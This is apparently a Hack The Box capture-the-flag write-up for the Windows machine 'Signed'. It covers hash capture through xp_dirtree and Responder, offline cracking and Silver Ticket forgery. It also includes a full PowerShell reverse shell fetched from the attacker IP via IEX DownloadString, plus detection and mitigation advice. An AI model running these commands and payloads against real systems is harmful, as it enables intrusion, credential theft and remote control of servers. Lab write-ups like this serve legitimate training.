---
title: "HTB Machine Signed"
date: 2025-10-17T13:28:11+02:00
draft: false 
tags: ["hackthebox", "writeup", "windows", "medium", "season 9"]
categories: ["CTF"]
---

## Machine Information
| Attribute | Value |
|-----------|-------|
| OS | Linux |
| Difficulty | Medium |
| Points | 30 |

## Machine Information

*   **Name:** Signed
*   **Difficulty:** Medium
*   **OS:** Windows
*   **Release Date:** 2025
*   **IP Address:** 10.129.219.89

## TL;DR

Initial access via MSSQL with credentials `scott:Sm230#C5NatH`. Used NTLM relay attack via `xp_dirtree` to capture the `mssqlsvc` service account hash. Cracked the hash and forged a Kerberos Silver Ticket to gain Administrator-level access to MSSQL. Enabled `xp_cmdshell` and obtained a reverse shell as `mssqlsvc` for the user flag. Forged another Silver Ticket with the correct SPN to authenticate as `mssqlsvc` and read the root flag directly from MSSQL using `OPENROWSET`.

* * *

## Reconnaissance

### Nmap Scan

```
nmap -sC -sV -vv -oA nmap/signed 10.129.219.89

```

**Key Findings:**

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM

ms-sql-ntlm-info: 
  Target_Name: SIGNED
  NetBIOS_Domain_Name: SIGNED
  NetBIOS_Computer_Name: DC01
  DNS_Domain_Name: SIGNED.HTB
  DNS_Computer_Name: DC01.SIGNED.HTB
  DNS_Tree_Name: SIGNED.HTB
  Product_Version: 10.0.17763

```

**Analysis:**

*   Only port **1433 (MSSQL)** is exposed
*   Domain: **SIGNED.HTB**
*   Hostname: **DC01.SIGNED.HTB**
*   SQL Server 2022 RTM

### Initial Credentials

From the machine description:

*   **Username:** `scott`
*   **Password:** `Sm230#C5NatH`

* * *

## Initial Access - MSSQL Enumeration

### Connect to MSSQL

```
mssqlclient.py SIGNED.HTB/scott:'Sm230#C5NatH'@DC01.SIGNED.HTB

```

### Enumerate Permissions

```
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 0 (not sysadmin)

-- Check current user
SELECT USER_NAME();
-- Result: guest

-- Enumerate logins
enum_logins

```

**Key Findings:**

*   User `scott` has **guest** privileges only
*   **SIGNED\\IT** group has **sysadmin** privileges
*   No direct `xp_cmdshell` access

### Enumerate Databases

```
enum_db

```

**Results:**

```
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1

```

**Important:** `msdb` has `is_trustworthy_on = 1` - potential privilege escalation vector.

* * *

## NTLM Relay Attack - Capturing Hashes

### Understanding the Attack

When SQL Server accesses a UNC path, it authenticates using the service account's credentials. We can capture this NTLM authentication and either:

1.  Crack the hash
2.  Relay it to another service

### Setup Responder

**Terminal 1 - Start Responder:**

```
sudo responder -I tun0 -v

```

### Trigger NTLM Authentication

**Terminal 2 - MSSQL:**

```
EXEC xp_dirtree '\\10.10.14.124\share';

```

### Captured Hash

Responder captured the `mssqlsvc` service account hash:

```
mssqlsvc::SIGNED:aaaaaaaaaaaaaaaa:1ba11b262fe18c3ef870161b2c026432:01010000000000000066b4e8883bdc01e58bd79530d10c910000000001001000560044006b006500720072004500520003001000560044006b0065007200720045005200020010006a007100420063004600420066005400040010006a007100420063004600420066005400070008000066b4e8883bdc01060004000200000008003000300000000000000000000000003000002f68640eb4191e99319db6319c27a3755a14996a4d51148b631caf86041bc2de0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100320034000000000000000000

```

### Crack the Hash

```
# Save hash to file
cat > mssqlsvc.hash << EOF
mssqlsvc::SIGNED:aaaaaaaaaaaaaaaa:1ba11b262fe18c3ef870161b2c026432:...
EOF

# Crack with hashcat
hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt

# Result:
# mssqlsvc:purPLE9795!

```

**Credentials obtained:** `mssqlsvc:purPLE9795!`

* * *

## Privilege Escalation - Kerberos Silver Ticket Forgery

### Understanding Silver Tickets

A **Silver Ticket** is a forged Kerberos TGS (Ticket Granting Service) ticket that allows authentication to a specific service without contacting the KDC. Requirements:

*   Service account NTLM hash
*   Domain SID
*   Target SPN (Service Principal Name)

### Extract NTLM Hash from Password

```
# Using Python
python3 -c "import hashlib; print(hashlib.new('md4', 'purPLE9795!'.encode('utf-16le')).hexdigest())"

# Result:
# ef699384c3285c54128a3ee1ddb1a0cc

```

### Get Domain SID

```
# Using impacket tools with valid credentials
lookupsid.py SIGNED.HTB/scott:'Sm230#C5NatH'@DC01.SIGNED.HTB

# Result:
# Domain SID: S-1-5-21-4088429403-1159899800-2753317549

```

### Forge Silver Ticket - Administrator

```
ticketer.py \
  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn IT/dc01.signed.htb \
  -groups 512,1105 \
  -user-id 500 \
  Administrator

```

**Parameters explained:**

*   `-nthash`: mssqlsvc NTLM hash
*   `-domain-sid`: Domain SID
*   `-spn`: Service Principal Name (using IT group)
*   `-groups 512,1105`: Domain Admins (512), Domain Computers (1105)
*   `-user-id 500`: Administrator RID

### Export Ticket

```
export KRB5CCNAME=Administrator.ccache

```

### Authenticate with Forged Ticket

```
mssqlclient.py DC01.SIGNED.HTB -windows-auth -k -no-pass

```

**Result:** Authenticated as `SIGNED\Administrator` with `dbo` role!

* * *

## Getting User Flag - Reverse Shell

### Enable xp\_cmdshell

```
-- Enable advanced options
enable_xp_cmdshell

-- Reconfigure
reconfigure

-- Test
EXEC xp_cmdshell 'whoami';
-- Output: SIGNED\mssqlsvc

```

**Note:** Even though we're authenticated as Administrator via Kerberos, commands execute as the SQL Server service account (`mssqlsvc`).

### Setup Reverse Shell

**Terminal 1 - Create PowerShell Reverse Shell:**

```
cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.124',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF

# Start HTTP server
python3 -m http.server 80

```

**Terminal 2 - Netcat Listener:**

```
rlwrap nc -lvnp 9001

```

### Execute Reverse Shell

**Terminal 3 - MSSQL:**

```
EXEC xp_cmdshell 'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.124/shell.ps1'')"';

```

### Get User Flag

```
PS C:\Windows\System32> whoami
SIGNED\mssqlsvc

PS C:\Windows\System32> type C:\Users\mssqlsvc\Desktop\user.txt
bxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

```

**User flag obtained!** ✅

* * *

## Getting Root Flag - Silver Ticket with Correct SPN

### The Problem

The initial Silver Ticket used SPN `IT/dc01.signed.htb`, but MSSQL expects `MSSQLSVC/DC01.SIGNED.HTB:1433`.

### Forge Correct Silver Ticket

```
ticketer.py \
  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn mssqlsvc/dc01.signed.htb \
  -groups 512,1105 \
  -user-id 1103 \
  mssqlsvc

```

**Key differences:**

*   `-spn mssqlsvc/dc01.signed.htb`: Correct SPN for SQL Server
*   `-user-id 1103`: mssqlsvc account RID
*   Username: `mssqlsvc` (instead of Administrator)

### Export New Ticket

```
export KRB5CCNAME=mssqlsvc.ccache

```

### Authenticate with Kerberos

```
mssqlclient.py DC01.SIGNED.HTB -k -no-pass -debug

```

**Authentication flow:**

```
[+] Using Kerberos Cache: mssqlsvc.ccache
[+] SPN MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for MSSQLSVC/DC01.SIGNED.HTB@SIGNED.HTB
[+] Using TGS from cache
[+] Changing sname from mssqlsvc/dc01.signed.htb@SIGNED.HTB to MSSQLSVC/DC01.SIGNED.HTB:1433@SIGNED.HTB

```

**Result:** Authenticated as `SIGNED\mssqlsvc` with `dbo` role!

### Read Root Flag with OPENROWSET

```
-- Enable xp_cmdshell (if needed)
enable_xp_cmdshell
reconfigure

-- Read root.txt using OPENROWSET (BULK read)
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS contents;

```

**Output:**

```
BulkColumn                                
---------------------------------------   
b'b10a2f8e00f2ff05aa4da0af9c2c1a3c\r\n'

```

**Root flag obtained!** ✅

* * *

## Attack Chain Summary

```
Initial Credentials (scott:Sm230#C5NatH)
    ↓
MSSQL Access (guest privileges)
    ↓
NTLM Relay via xp_dirtree
    ↓
Capture mssqlsvc Hash
    ↓
Crack Hash (purPLE9795!)
    ↓
Extract NTLM Hash from Password
    ↓
Forge Silver Ticket (Administrator)
    ↓
MSSQL as Administrator (enable xp_cmdshell)
    ↓
Reverse Shell as mssqlsvc
    ↓
User Flag
    ↓
Forge Silver Ticket (mssqlsvc with correct SPN)
    ↓
MSSQL with dbo privileges
    ↓
Read root.txt via OPENROWSET
    ↓
Root Flag

```

* * *

## Key Concepts Explained

### 1\. NTLM Relay Attack

When SQL Server accesses a UNC path (like `\\10.10.14.124\share`), it:

1.  Attempts to authenticate to the remote SMB server
2.  Sends the service account's NTLM credentials
3.  This can be captured using Responder

**Why it works:**

*   SQL Server runs as a service account (mssqlsvc)
*   Service accounts often have elevated privileges
*   NTLM authentication can be captured and cracked offline

### 2\. Kerberos Silver Tickets

**Normal Kerberos flow:**

1.  User requests TGT from KDC
2.  User requests TGS for specific service from KDC
3.  User presents TGS to service
4.  Service validates TGS with KDC

**Silver Ticket attack:**

1.  Attacker has service account NTLM hash
2.  Attacker forges a TGS ticket
3.  Service validates ticket locally (no KDC contact)
4.  Attacker gains access to service

**Requirements:**

*   Service account NTLM hash
*   Domain SID
*   Target SPN
*   Knowledge of Kerberos ticket structure

**Why it works:**

*   Services validate tickets using their own password (NTLM hash)
*   No communication with KDC during validation
*   Hard to detect (no KDC logs)

### 3\. Service Principal Names (SPNs)

SPNs identify service instances in Active Directory:

*   Format: `SERVICE/HOST:PORT`
*   Examples:
    *   `MSSQLSVC/DC01.SIGNED.HTB:1433`
    *   `HTTP/web.domain.com:80`
    *   `CIFS/fileserver.domain.com`

**Why SPNs matter:**

*   Kerberos uses SPNs to identify services
*   Wrong SPN = authentication failure
*   Must match exactly what service expects

### 4\. OPENROWSET in MSSQL

`OPENROWSET` allows reading external data sources:

```
-- Read file as binary
SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_BLOB) AS contents;

-- Read file as text (CLOB = Character Large Object)
SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS contents;

```

**Permissions required:**

*   `ADMINISTER BULK OPERATIONS` or
*   `ADMINISTER DATABASE BULK OPERATIONS` or
*   `dbo` role (which we have via Silver Ticket)

* * *

## Tools Used

*   **Nmap** - Port scanning and service enumeration
*   **Impacket suite:**
    *   `mssqlclient.py` - MSSQL client
    *   `ticketer.py` - Kerberos ticket forging
    *   `lookupsid.py` - Domain SID enumeration
*   **Responder** - NTLM hash capture
*   **Hashcat** - Password cracking
*   **Netcat** - Reverse shell listener
*   **Python** - NTLM hash generation

* * *

## Indicators of Compromise (IOCs)

### Network Indicators

*   Suspicious SMB connections from DC01 to attacker IP
*   MSSQL connections from unusual IPs
*   Kerberos authentication without TGT requests

### Host Indicators

*   `xp_cmdshell` enabled when it shouldn't be
*   PowerShell downloads from external IPs
*   Reverse shell connections to external IPs
*   OPENROWSET queries to sensitive files

### Log Indicators

*   Event ID 4688: New process creation (powershell.exe via SQL Server)
*   Event ID 4624: Kerberos authentication without corresponding TGT
*   SQL Server logs: `xp_cmdshell` execution
*   SQL Server logs: `xp_dirtree` to external UNC paths

* * *

## Mitigation Recommendations

### 1\. MSSQL Hardening

*   **Disable xp\_cmdshell** on all SQL Server instances
*   Implement least privilege for database accounts
*   Regularly audit SQL Server permissions
*   Enable SQL Server audit logging

### 2\. Service Account Security

*   Use **gMSA** (Group Managed Service Accounts) for SQL Server
*   Implement strong, unique passwords for service accounts
*   Rotate service account passwords regularly
*   Monitor service account authentication patterns

### 3\. Network Security

*   Implement SMB signing (prevents NTLM relay)
*   Disable NTLM authentication where possible
*   Use IPSec or network segmentation
*   Monitor outbound SMB connections from servers

### 4\. Kerberos Security

*   Enable **PAC validation** on all services
*   Implement **Kerberos Armoring** (FAST)
*   Monitor for TGS requests without corresponding TGT
*   Use **Kerberos Constrained Delegation** instead of unconstrained

### 5\. Detection and Monitoring

*   Monitor for:
    *   `xp_dirtree` to external IPs
    *   PowerShell execution by SQL Server service
    *   Kerberos Silver Ticket indicators (TGS without TGT)
    *   OPENROWSET queries to OS files
*   Implement SIEM with SQL Server log integration
*   Use Microsoft Defender for Identity (formerly Azure ATP)

* * *

## Alternative Attack Vectors

### 1\. If msdb is Trustworthy (We Found This!)

```
USE msdb;
CREATE PROCEDURE sp_elevate
WITH EXECUTE AS OWNER
AS BEGIN
    EXEC sp_addsrvrolemember 'SIGNED\scott', 'sysadmin';
END;
GO
EXEC sp_elevate;

```

**Note:** This didn't work because guest role lacks CREATE PROCEDURE permissions.

### 2\. If Impersonation Was Possible

```
USE msdb;
EXECUTE AS USER = 'MS_DataCollectorInternalUser';
-- Then execute commands with elevated privileges

```

**Note:** Impersonation was denied in this case.

### 3\. Alternative Tools

*   **mssql\_shell.py** - Enhanced MSSQL interaction script
*   **Metasploit modules:**
    *   `exploit/windows/mssql/mssql_payload`
    *   `auxiliary/admin/mssql/mssql_ntlm_stealer`
*   **PowerUpSQL** - PowerShell toolkit for SQL Server attacks

* * *

## Lessons Learned

1.  **Limited exposure doesn't mean limited attack surface** - Only MSSQL was exposed, but it was enough
2.  **Service accounts are high-value targets** - They often have elevated privileges
3.  **NTLM is still vulnerable** - Even in 2025, NTLM relay attacks work
4.  **Silver Tickets are powerful** - With just a password, you can forge Kerberos tickets
5.  **Always check trustworthy databases** - msdb with trustworthy=1 is a known priv esc vector
6.  **SPN details matter** - The correct SPN format is crucial for Kerberos authentication

* * *

## References

*   [Impacket Documentation](https://github.com/fortra/impacket)
*   [Silver Ticket Attack](https://adsecurity.org/?p=2011)
*   [MSSQL Privilege Escalation](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
*   [Kerberos Authentication](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)

* * *

## Flags

*   **User Flag:** `C:\Users\mssqlsvc\Desktop\user.txt`
*   **Root Flag:** `C:\Users\Administrator\Desktop\root.txt` (via OPENROWSET)

* * *

_Writeup by: \[Your Name\]_  
_Machine: Signed (HTB)_  
_Date: October 2025_  
_Difficulty: Medium_
